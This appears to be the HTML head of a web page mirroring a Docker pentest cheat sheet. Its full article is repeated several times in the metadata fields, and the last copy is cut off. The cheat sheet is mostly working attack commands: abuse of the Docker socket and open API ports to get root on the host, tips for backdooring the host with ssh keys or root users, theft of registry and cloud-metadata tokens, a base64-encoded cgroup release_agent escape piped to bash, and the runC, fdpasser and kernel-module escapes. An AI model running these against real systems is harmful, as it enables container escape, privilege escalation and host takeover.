<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Container docker pentest" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Docker Pentest Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver software in packages called containers. Summary Tools Mounted Docker Socket Open Docker API Port Insecure Docker Registry Exploit privileged container abusing the Linux cgroup v1 Breaking out of Docker via runC Breaking out of containers using a device file References Tools Dockscan : Dockscan is security vulnerability and audit scanner for Docker installations 1 2 dockscan unix:///var/run/docker.sock dockscan -r html -o myreport -v tcp://example.com:5422 DeepCe : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) 1 2 3 4 ./deepce.sh ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce ./deepce.sh --no-enumeration --exploit SOCK --shadow ./deepce.sh --no-enumeration --exploit DOCKER --command &quot;whoami&gt;/tmp/hacked&quot; Mounted Docker Socket Prerequisite: Socker mounted as volume : - &quot;/var/run/docker.sock:/var/run/docker.sock&quot; Usually found in /var/run/docker.sock, for example for Portainer. 1 2 3 curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json curl -XPOST –unix-socket /var/run/docker.sock -d &#39;{&quot;Image&quot;:&quot;nginx&quot;}&#39; -H &#39;Content-Type: application/json&#39; http://localhost/containers/create curl -XPOST –unix-socket /var/run/docker.sock http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start Exploit using brompwnie/ed 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 root@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/var/run/ -autopwn=true [+] Hunt dem Socks [+] Hunting Down UNIX Domain Sockets from: /var/run/ [*] Valid Socket: /var/run/docker.sock [+] Attempting to autopwn [+] Hunting Docker Socks [+] Attempting to Autopwn: /var/run/docker.sock [*] Getting Docker client... [*] Successfully got Docker client... [+] Attempting to escape to host... [+] Attempting in TTY Mode chroot /host &amp;&amp; clear echo &#39;You are now on the underlying host&#39; chroot /host &amp;&amp; clear echo &#39;You are now on the underlying host&#39; / # chroot /host &amp;&amp; clear / # echo &#39;You are now on the underlying host&#39; You are now on the underlying host / # id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) Open Docker API Port Prerequisite: Docker runned with -H tcp://0.0.0.0:XXXX 1 2 3 4 5 $ nmap -sCV 10.10.10.10 -p 2376 2376/tcp open docker Docker 19.03.5 | docker-version: | Version: 19.03.5 | MinAPIVersion: 1.12 Mount the current system inside a new “temporary” Ubuntu container, you will gain root access to the filesystem in /mnt. 1 2 3 4 5 6 7 8 $ export DOCKER_HOST=tcp://10.10.10.10:2376 $ docker run --name ubuntu_bash --rm -i -v /:/mnt -u 0 -t ubuntu bash or $ docker -H open.docker.socket:2375 ps $ docker -H open.docker.socket:2375 exec -it mysql /bin/bash or $ curl -s –insecure https://tls-opendocker.socket:2376/secrets | jq $ curl –insecure -X POST -H &quot;Content-Type: application/json&quot; https://tls-opendocker.socket2376/containers/create?name=test -d &#39;{&quot;Image&quot;:&quot;alpine&quot;, &quot;Cmd&quot;:[&quot;/usr/bin/tail&quot;, &quot;-f&quot;, &quot;1234&quot;, &quot;/dev/null&quot;], &quot;Binds&quot;: [ &quot;/:/mnt&quot; ], &quot;Privileged&quot;: true}&#39; From there you can backdoor the filesystem by adding an ssh key in /root/.ssh or adding a new root user in /etc/passwd. Insecure Docker Registry Docker Registry’s fingerprint is Docker-Distribution-Api-Version header. Then connect to Registry API endpoint: /v2/_catalog. 1 2 3 4 5 6 7 8 9 10 11 12 curl https://registry.example.com/v2/&lt;image_name&gt;/tags/list docker pull https://registry.example.com:443/&lt;image_name&gt;:&lt;tag&gt; # connect to the endpoint and list image blobs curl -s -k --user &quot;admin:admin&quot; https://docker.registry.local/v2/_catalog curl -s -k --user &quot;admin:admin&quot; https://docker.registry.local/v2/wordpress-image/tags/list curl -s -k --user &quot;admin:admin&quot; https://docker.registry.local/v2/wordpress-image/manifests/latest # download blobs curl -s -k --user &#39;admin:admin&#39; &#39;http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058&#39; &gt; out.tar.gz # automated download https://github.com/NotSoSecure/docker_fetch/ python /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local Access a private registry and start a container with one of its image 1 2 3 docker login -u admin -p admin docker.registry.local docker pull docker.registry.local/wordpress-image docker run -it docker.registry.local/wordpress-image /bin/bash Access a private registry using OAuth Token from Google 1 2 3 curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token docker login -e &lt;email&gt; -u oauth2accesstoken -p &quot;&lt;access token&gt;&quot; https://gcr.io Exploit privileged container abusing the Linux cgroup v1 Prerequisite (at least one): --privileged --security-opt apparmor=unconfined --cap-add=SYS_ADMIN flags. 1 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash -c &#39;echo &quot;cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAi4oCiPygowq/CsMK3Ll8u4oCiIHByb2ZpdCEg4oCiLl8uwrfCsMKvKSnYn+KAoiIK&quot; | base64 -d | bash -&#39; Exploit breakdown : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # On the host docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash # In the container mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x echo 1 &gt; /tmp/cgrp/x/notify_on_release host_path=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab` echo &quot;$host_path/cmd&quot; &gt; /tmp/cgrp/release_agent echo &#39;#!/bin/sh&#39; &gt; /cmd echo &quot;ps aux &gt; $host_path/output&quot; &gt;&gt; /cmd chmod a+x /cmd sh -c &quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot; Breaking out of Docker via runC The vulnerability allows a malicious container to (with minimal user interaction) overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command … as root within a container in either of these contexts: Creating a new container using an attacker-controlled image. Attaching (docker exec) into an existing container which the attacker had previous write access to. - Vulnerability overview by the runC team Exploit for CVE-2019-5736 : https://github.com/twistlock/RunC-CVE-2019-5736 1 2 $ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC $ docker run --rm cve-2019-5736:malicious_image_POC Breaking out of containers using a device file 1 2 3 4 5 https://github.com/FSecureLABS/fdpasser In container, as root: ./fdpasser recv /moo /etc/shadow Outside container, as UID 1000: ./fdpasser send /proc/$(pgrep -f &quot;sleep 1337&quot;)/root/moo Outside container: ls -la /etc/shadow Output: -rwsrwsrwx 1 root shadow 1209 Oct 10 2019 /etc/shadow Breaking out of Docker via kernel modules loading When privileged Linux containers attempt to load kernel modules, the modules are loaded into the host’s kernel (because there is only one kernel, unlike VMs). This provides a route to an easy container escape. Exploitation: Clone the repository : git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping Build with make Start a privileged docker container with docker run -it --privileged --hostname docker --mount &quot;type=bind,src=$PWD,dst=/root&quot; ubuntu cd /root in the new container Insert the kernel module with ./escape Run ./execute! Unlike other techniques, this module doesn’t contain any syscalls hooks, but merely creates two new proc files; /proc/escape and /proc/output. /proc/escape only answers to write requests and simply executes anything that’s passed to it via call_usermodehelper(). /proc/output just takes input and stores it in a buffer when written to, then returns that buffer when it’s read from - essentially acting a like a file that both the container and the host can read/write to. The clever part is that anything we write to /proc/escape gets sandwiched into /bin/sh -c &lt;INPUT&gt; &gt; /proc/output. This means that the command is run under /bin/sh and the output is redirected to /proc/output, which we can then read from within the container. Once the module is loaded, you can simply echo &quot;cat /etc/passwd&quot; &gt; /proc/escape and then get the result via cat /proc/output. Alternatively, you can use the execute program to give yourself a makeshift shell (albeit an extraordinarily basic one). The only caveat is that we cannot be sure that the container has kmod installed (which provides insmod and rmmod). To overcome this, after building the kernel module, we load it’s byte array into a C program, which then uses the init_module() syscall to load the module into the kernel without needing insmod. If you’re interested, take a look at the Makefile. References Hacking Docker Remotely - 17 March 2020 - ch0ks Understanding Docker container escapes - JULY 19, 2019 - Trail of Bits Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon Breaking out of Docker via runC – Explaining CVE-2019-5736 - Yuval Avrahami - February 21, 2019 CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host - dragonsector.pl OWASP - Docker Security CheatSheet Anatomy of a hack: Docker Registry - NotSoSecure - April 6, 2017 Linux Kernel Hacking 3.8: Privileged Container Escapes - Harvey Phillips @xcellerator" />
<meta property="og:description" content="Docker Pentest Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver software in packages called containers. Summary Tools Mounted Docker Socket Open Docker API Port Insecure Docker Registry Exploit privileged container abusing the Linux cgroup v1 Breaking out of Docker via runC Breaking out of containers using a device file References Tools Dockscan : Dockscan is security vulnerability and audit scanner for Docker installations 1 2 dockscan unix:///var/run/docker.sock dockscan -r html -o myreport -v tcp://example.com:5422 DeepCe : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) 1 2 3 4 ./deepce.sh ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce ./deepce.sh --no-enumeration --exploit SOCK --shadow ./deepce.sh --no-enumeration --exploit DOCKER --command &quot;whoami&gt;/tmp/hacked&quot; Mounted Docker Socket Prerequisite: Socker mounted as volume : - &quot;/var/run/docker.sock:/var/run/docker.sock&quot; Usually found in /var/run/docker.sock, for example for Portainer. 1 2 3 curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json curl -XPOST –unix-socket /var/run/docker.sock -d &#39;{&quot;Image&quot;:&quot;nginx&quot;}&#39; -H &#39;Content-Type: application/json&#39; http://localhost/containers/create curl -XPOST –unix-socket /var/run/docker.sock http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start Exploit using brompwnie/ed 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 root@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/var/run/ -autopwn=true [+] Hunt dem Socks [+] Hunting Down UNIX Domain Sockets from: /var/run/ [*] Valid Socket: /var/run/docker.sock [+] Attempting to autopwn [+] Hunting Docker Socks [+] Attempting to Autopwn: /var/run/docker.sock [*] Getting Docker client... [*] Successfully got Docker client... [+] Attempting to escape to host... [+] Attempting in TTY Mode chroot /host &amp;&amp; clear echo &#39;You are now on the underlying host&#39; chroot /host &amp;&amp; clear echo &#39;You are now on the underlying host&#39; / # chroot /host &amp;&amp; clear / # echo &#39;You are now on the underlying host&#39; You are now on the underlying host / # id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) Open Docker API Port Prerequisite: Docker runned with -H tcp://0.0.0.0:XXXX 1 2 3 4 5 $ nmap -sCV 10.10.10.10 -p 2376 2376/tcp open docker Docker 19.03.5 | docker-version: | Version: 19.03.5 | MinAPIVersion: 1.12 Mount the current system inside a new “temporary” Ubuntu container, you will gain root access to the filesystem in /mnt. 1 2 3 4 5 6 7 8 $ export DOCKER_HOST=tcp://10.10.10.10:2376 $ docker run --name ubuntu_bash --rm -i -v /:/mnt -u 0 -t ubuntu bash or $ docker -H open.docker.socket:2375 ps $ docker -H open.docker.socket:2375 exec -it mysql /bin/bash or $ curl -s –insecure https://tls-opendocker.socket:2376/secrets | jq $ curl –insecure -X POST -H &quot;Content-Type: application/json&quot; https://tls-opendocker.socket2376/containers/create?name=test -d &#39;{&quot;Image&quot;:&quot;alpine&quot;, &quot;Cmd&quot;:[&quot;/usr/bin/tail&quot;, &quot;-f&quot;, &quot;1234&quot;, &quot;/dev/null&quot;], &quot;Binds&quot;: [ &quot;/:/mnt&quot; ], &quot;Privileged&quot;: true}&#39; From there you can backdoor the filesystem by adding an ssh key in /root/.ssh or adding a new root user in /etc/passwd. Insecure Docker Registry Docker Registry’s fingerprint is Docker-Distribution-Api-Version header. Then connect to Registry API endpoint: /v2/_catalog. 1 2 3 4 5 6 7 8 9 10 11 12 curl https://registry.example.com/v2/&lt;image_name&gt;/tags/list docker pull https://registry.example.com:443/&lt;image_name&gt;:&lt;tag&gt; # connect to the endpoint and list image blobs curl -s -k --user &quot;admin:admin&quot; https://docker.registry.local/v2/_catalog curl -s -k --user &quot;admin:admin&quot; https://docker.registry.local/v2/wordpress-image/tags/list curl -s -k --user &quot;admin:admin&quot; https://docker.registry.local/v2/wordpress-image/manifests/latest # download blobs curl -s -k --user &#39;admin:admin&#39; &#39;http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058&#39; &gt; out.tar.gz # automated download https://github.com/NotSoSecure/docker_fetch/ python /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local Access a private registry and start a container with one of its image 1 2 3 docker login -u admin -p admin docker.registry.local docker pull docker.registry.local/wordpress-image docker run -it docker.registry.local/wordpress-image /bin/bash Access a private registry using OAuth Token from Google 1 2 3 curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token docker login -e &lt;email&gt; -u oauth2accesstoken -p &quot;&lt;access token&gt;&quot; https://gcr.io Exploit privileged container abusing the Linux cgroup v1 Prerequisite (at least one): --privileged --security-opt apparmor=unconfined --cap-add=SYS_ADMIN flags. 1 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash -c &#39;echo &quot;cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAi4oCiPygowq/CsMK3Ll8u4oCiIHByb2ZpdCEg4oCiLl8uwrfCsMKvKSnYn+KAoiIK&quot; | base64 -d | bash -&#39; Exploit breakdown : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # On the host docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash # In the container mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x echo 1 &gt; /tmp/cgrp/x/notify_on_release host_path=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab` echo &quot;$host_path/cmd&quot; &gt; /tmp/cgrp/release_agent echo &#39;#!/bin/sh&#39; &gt; /cmd echo &quot;ps aux &gt; $host_path/output&quot; &gt;&gt; /cmd chmod a+x /cmd sh -c &quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot; Breaking out of Docker via runC The vulnerability allows a malicious container to (with minimal user interaction) overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command … as root within a container in either of these contexts: Creating a new container using an attacker-controlled image. Attaching (docker exec) into an existing container which the attacker had previous write access to. - Vulnerability overview by the runC team Exploit for CVE-2019-5736 : https://github.com/twistlock/RunC-CVE-2019-5736 1 2 $ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC $ docker run --rm cve-2019-5736:malicious_image_POC Breaking out of containers using a device file 1 2 3 4 5 https://github.com/FSecureLABS/fdpasser In container, as root: ./fdpasser recv /moo /etc/shadow Outside container, as UID 1000: ./fdpasser send /proc/$(pgrep -f &quot;sleep 1337&quot;)/root/moo Outside container: ls -la /etc/shadow Output: -rwsrwsrwx 1 root shadow 1209 Oct 10 2019 /etc/shadow Breaking out of Docker via kernel modules loading When privileged Linux containers attempt to load kernel modules, the modules are loaded into the host’s kernel (because there is only one kernel, unlike VMs). This provides a route to an easy container escape. Exploitation: Clone the repository : git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping Build with make Start a privileged docker container with docker run -it --privileged --hostname docker --mount &quot;type=bind,src=$PWD,dst=/root&quot; ubuntu cd /root in the new container Insert the kernel module with ./escape Run ./execute! Unlike other techniques, this module doesn’t contain any syscalls hooks, but merely creates two new proc files; /proc/escape and /proc/output. /proc/escape only answers to write requests and simply executes anything that’s passed to it via call_usermodehelper(). /proc/output just takes input and stores it in a buffer when written to, then returns that buffer when it’s read from - essentially acting a like a file that both the container and the host can read/write to. The clever part is that anything we write to /proc/escape gets sandwiched into /bin/sh -c &lt;INPUT&gt; &gt; /proc/output. This means that the command is run under /bin/sh and the output is redirected to /proc/output, which we can then read from within the container. Once the module is loaded, you can simply echo &quot;cat /etc/passwd&quot; &gt; /proc/escape and then get the result via cat /proc/output. Alternatively, you can use the execute program to give yourself a makeshift shell (albeit an extraordinarily basic one). The only caveat is that we cannot be sure that the container has kmod installed (which provides insmod and rmmod). To overcome this, after building the kernel module, we load it’s byte array into a C program, which then uses the init_module() syscall to load the module into the kernel without needing insmod. If you’re interested, take a look at the Makefile. References Hacking Docker Remotely - 17 March 2020 - ch0ks Understanding Docker container escapes - JULY 19, 2019 - Trail of Bits Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon Breaking out of Docker via runC – Explaining CVE-2019-5736 - Yuval Avrahami - February 21, 2019 CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host - dragonsector.pl OWASP - Docker Security CheatSheet Anatomy of a hack: Docker Registry - NotSoSecure - April 6, 2017 Linux Kernel Hacking 3.8: Privileged Container Escapes - Harvey Phillips @xcellerator" />
<link rel="canonical" href="http://localhost:4000/Container-Docker-Pentest/" />
<meta property="og:url" content="http://localhost:4000/Container-Docker-Pentest/" />
<meta property="og:site_name" content="PayloadsAllTheThings" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-12-13T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Container docker pentest" />
<meta name="twitter:site" content="@Zxce3_" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Container docker pentest","dateModified":"2020-12-13T00:00:00+07:00","datePublished":"2020-12-13T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Container-Docker-Pentest/"},"url":"http://localhost:4000/Container-Docker-Pentest/","description":"Docker Pentest Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver software in packages called containers. Summary Tools Mounted Docker Socket Open Docker API Port Insecure Docker Registry Exploit privileged container abusing the Linux cgroup v1 Breaking out of Docker via runC Breaking out of containers using a device file References Tools Dockscan : Dockscan is security vulnerability and audit scanner for Docker installations 1 2 dockscan unix:///var/run/docker.sock dockscan -r html -o myreport -v tcp://example.com:5422 DeepCe : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) 1 2 3 4 ./deepce.sh ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce ./deepce.sh --no-enumeration --exploit SOCK --shadow ./deepce.sh --no-enumeration --exploit DOCKER --command &quot;whoami&gt;/tmp/hacked&quot; Mounted Docker Socket Prerequisite: Socker mounted as volume : - &quot;/var/run/docker.sock:/var/run/docker.sock&quot; Usually found in /var/run/docker.sock, for example for Portainer. 1 2 3 curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json curl -XPOST –unix-socket /var/run/docker.sock -d &#39;{&quot;Image&quot;:&quot;nginx&quot;}&#39; -H &#39;Content-Type: application/json&#39; http://localhost/containers/create curl -XPOST –unix-socket /var/run/docker.sock http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start Exploit using brompwnie/ed 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 root@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/var/run/ -autopwn=true [+] Hunt dem Socks [+] Hunting Down UNIX Domain Sockets from: /var/run/ [*] Valid Socket: /var/run/docker.sock [+] Attempting to autopwn [+] Hunting Docker Socks [+] Attempting to Autopwn: /var/run/docker.sock [*] Getting Docker client... [*] Successfully got Docker client... [+] Attempting to escape to host... [+] Attempting in TTY Mode chroot /host &amp;&amp; clear echo &#39;You are now on the underlying host&#39; chroot /host &amp;&amp; clear echo &#39;You are now on the underlying host&#39; / # chroot /host &amp;&amp; clear / # echo &#39;You are now on the underlying host&#39; You are now on the underlying host / # id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) Open Docker API Port Prerequisite: Docker runned with -H tcp://0.0.0.0:XXXX 1 2 3 4 5 $ nmap -sCV 10.10.10.10 -p 2376 2376/tcp open docker Docker 19.03.5 | docker-version: | Version: 19.03.5 | MinAPIVersion: 1.12 Mount the current system inside a new “temporary” Ubuntu container, you will gain root access to the filesystem in /mnt. 1 2 3 4 5 6 7 8 $ export DOCKER_HOST=tcp://10.10.10.10:2376 $ docker run --name ubuntu_bash --rm -i -v /:/mnt -u 0 -t ubuntu bash or $ docker -H open.docker.socket:2375 ps $ docker -H open.docker.socket:2375 exec -it mysql /bin/bash or $ curl -s –insecure https://tls-opendocker.socket:2376/secrets | jq $ curl –insecure -X POST -H &quot;Content-Type: application/json&quot; https://tls-opendocker.socket2376/containers/create?name=test -d &#39;{&quot;Image&quot;:&quot;alpine&quot;, &quot;Cmd&quot;:[&quot;/usr/bin/tail&quot;, &quot;-f&quot;, &quot;1234&quot;, &quot;/dev/null&quot;], &quot;Binds&quot;: [ &quot;/:/mnt&quot; ], &quot;Privileged&quot;: true}&#39; From there you can backdoor the filesystem by adding an ssh key in /root/.ssh or adding a new root user in /etc/passwd. Insecure Docker Registry Docker Registry’s fingerprint is Docker-Distribution-Api-Version header. Then connect to Registry API endpoint: /v2/_catalog. 1 2 3 4 5 6 7 8 9 10 11 12 curl https://registry.example.com/v2/&lt;image_name&gt;/tags/list docker pull https://registry.example.com:443/&lt;image_name&gt;:&lt;tag&gt; # connect to the endpoint and list image blobs curl -s -k --user &quot;admin:admin&quot; https://docker.registry.local/v2/_catalog curl -s -k --user &quot;admin:admin&quot; https://docker.registry.local/v2/wordpress-image/tags/list curl -s -k --user &quot;admin:admin&quot; https://docker.registry.local/v2/wordpress-image/manifests/latest # download blobs curl -s -k --user &#39;admin:admin&#39; &#39;http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058&#39; &gt; out.tar.gz # automated download https://github.com/NotSoSecure/docker_fetch/ python /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local Access a private registry and start a container with one of its image 1 2 3 docker login -u admin -p admin docker.registry.local docker pull docker.registry.local/wordpress-image docker run -it docker.registry.local/wordpress-image /bin/bash Access a private registry using OAuth Token from Google 1 2 3 curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token docker login -e &lt;email&gt; -u oauth2accesstoken -p &quot;&lt;access token&gt;&quot; https://gcr.io Exploit privileged container abusing the Linux cgroup v1 Prerequisite (at least one): --privileged --security-opt apparmor=unconfined --cap-add=SYS_ADMIN flags. 1 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash -c &#39;echo &quot;cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAi4oCiPygowq/CsMK3Ll8u4oCiIHByb2ZpdCEg4oCiLl8uwrfCsMKvKSnYn+KAoiIK&quot; | base64 -d | bash -&#39; Exploit breakdown : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # On the host docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash # In the container mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x echo 1 &gt; /tmp/cgrp/x/notify_on_release host_path=`sed -n &#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p&#39; /etc/mtab` echo &quot;$host_path/cmd&quot; &gt; /tmp/cgrp/release_agent echo &#39;#!/bin/sh&#39; &gt; 